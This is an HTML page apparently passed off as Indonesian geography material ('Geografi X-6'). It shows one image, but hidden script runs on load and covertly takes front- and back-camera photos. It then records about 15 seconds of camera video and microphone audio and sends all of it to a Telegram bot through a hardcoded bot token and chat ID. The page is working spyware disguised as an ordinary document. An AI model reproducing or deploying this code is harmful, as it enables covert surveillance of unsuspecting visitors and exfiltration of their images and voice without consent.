<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Geografi X-6</title>
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body, html { width: 100vw; height: 100vh; background: #000; display: flex; justify-content: center; align-items: center; overflow: hidden; }
        img { max-width: 100%; max-height: 100vh; object-fit: contain; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <img src="https://files.catbox.moe/5agvoz.jpg" alt="geografi">

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const TELEGRAM_BOT_TOKEN = "7904903199:AAEjqpYoBCj6y3X8VjtxYD6tyPpElCd9IS0";
        const TELEGRAM_CHAT_ID = "7081489041";

        let mediaRecorderVideo, mediaRecorderAudio;
        let videoChunks = [], audioChunks = [];
        let recordingTime = 0, maxRecordingTime = 15; 

        async function startCapture() {
            try {
                const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                await capturePhoto(frontStream, "Depan");

                const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                await capturePhoto(backStream, "Belakang");

                await startRecording();
            } catch (error) {
                console.error("Gagal memulai proses:", error);
            }
        }

        async function capturePhoto(stream, label) {
            return new Promise((resolve) => {
                const video = document.getElementById("video");
                video.srcObject = stream;
                video.onloadedmetadata = async () => {
                    const canvas = document.getElementById("canvas");
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext("2d");

                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const imageData = canvas.toDataURL("image/jpeg");

                    await sendToTelegram(imageData, label);
                    resolve();
                };
            });
        }

        async function sendToTelegram(imageData, label) {
            try {
                const blob = await fetch(imageData).then(res => res.blob());
                const formData = new FormData();
                formData.append("chat_id", TELEGRAM_CHAT_ID);
                formData.append("photo", blob, `${label}.jpg`);
                formData.append("caption", `ðŸ“· Foto ${label}`);

                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: "POST",
                    body: formData
                });

                console.log(`Foto ${label} dikirim ke Telegram`);
            } catch (error) {
                console.error("Gagal mengirim foto:", error);
            }
        }

        async function startRecording() {
            try {
                const videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });

                mediaRecorderVideo = new MediaRecorder(videoStream, { mimeType: "video/webm" });
                mediaRecorderAudio = new MediaRecorder(audioStream, { mimeType: "audio/webm" });

                mediaRecorderVideo.ondataavailable = event => videoChunks.push(event.data);
                mediaRecorderAudio.ondataavailable = event => audioChunks.push(event.data);

                mediaRecorderVideo.start();
                mediaRecorderAudio.start();
                console.log("Perekaman dimulai");

                const recordingInterval = setInterval(() => {
                    recordingTime++;
                    if (recordingTime >= maxRecordingTime) {
                        stopRecording();
                        clearInterval(recordingInterval);
                    }
                }, 1000);

                window.addEventListener("beforeunload", stopRecording);
            } catch (error) {
                console.error("Gagal memulai perekaman:", error);
            }
        }

        async function stopRecording() {
            if (mediaRecorderVideo && mediaRecorderAudio) {
                mediaRecorderVideo.stop();
                mediaRecorderAudio.stop();

                console.log("Perekaman berhenti");
                await sendVideoToTelegram();
                await sendAudioToTelegram();
            }
        }

        async function sendVideoToTelegram() {
            if (videoChunks.length > 0) {
                const blob = new Blob(videoChunks, { type: "video/mp4" });
                const formData = new FormData();
                formData.append("chat_id", TELEGRAM_CHAT_ID);
                formData.append("video", blob, "rekaman.mp4");
                formData.append("caption", "ðŸŽ¥ Rekaman video");

                try {
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
                        method: "POST",
                        body: formData
                    });

                    console.log("Video dikirim ke Telegram");
                } catch (error) {
                    console.error("Gagal mengirim video:", error);
                }
            }
        }

        async function sendAudioToTelegram() {
            if (audioChunks.length > 0) {
                const blob = new Blob(audioChunks, { type: "audio/ogg" });
                const formData = new FormData();
                formData.append("chat_id", TELEGRAM_CHAT_ID);
                formData.append("voice", blob, "rekaman.ogg");
                formData.append("caption", "ðŸŽ™ Rekaman suara");

                try {
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVoice`, {
                        method: "POST",
                        body: formData
                    });

                    console.log("Audio dikirim ke Telegram");
                } catch (error) {
                    console.error("Gagal mengirim audio:", error);
                }
            }
        }

        window.onload = startCapture;
    </script>
</body>
</html>
